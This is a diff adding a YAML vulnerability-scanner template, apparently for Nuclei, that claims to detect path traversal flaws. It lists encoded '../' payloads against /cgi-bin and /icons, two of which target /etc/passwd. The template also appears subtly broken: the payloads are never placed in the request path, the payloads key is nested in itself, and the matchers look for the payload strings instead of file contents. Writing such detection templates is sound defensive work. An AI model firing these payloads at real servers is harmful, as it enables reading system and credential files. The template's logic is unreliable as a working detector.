@@ -1,0 +1,27 @@
+id: path-traversal-detection
+
+info:
+  name: Path Traversal Detection
+  author: Twilight Sparkle
+  severity: critical
+  description: Detects Path Traversal vulnerabilities
+  tags: path traversal, twilight-sparkle
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      payloads:
+        - "/cgi-bin/%2e%2e/%2e%2e/%2e%2e"
+        - "/cgi-bin/....//....//"
+        - "/icons/.%2e/.%2e/.%2e/etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+matchers:
+  - type: word
+    words:
+      - "/cgi-bin/%2e%2e/%2e%2e/%2e%2e"
+      - "/cgi-bin/....//....//"
+      - "/icons/.%2e/.%2e/.%2e/etc/passwd"
+      - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    condition: or
